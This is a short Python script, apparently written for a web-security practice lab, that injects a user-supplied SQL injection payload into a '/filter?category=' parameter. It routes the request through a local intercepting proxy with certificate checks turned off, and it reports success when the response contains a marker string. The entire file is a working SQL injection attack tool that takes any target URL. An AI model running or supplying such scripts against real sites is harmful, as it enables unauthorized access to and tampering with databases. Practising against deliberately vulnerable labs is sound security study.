# sqli by xspatrian

import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def exploit_sqli(base_url, payload):
    target_url = f"{base_url}/filter?category={payload}"
    r = requests.get(target_url, verify=False, proxies=proxies)
    if "cat Grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        base_url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[-] Usage: %s <url> <payload>" % sys.argv[0])
        print('[-] Example: %s www.example.com "1=1"' % sys.argv[0])
        sys.exit(-1)

    if exploit_sqli(base_url, payload):
        print("[+] SQL injection successfully!")
    else:
        print("[-] SQL injection unsuccessfully!")
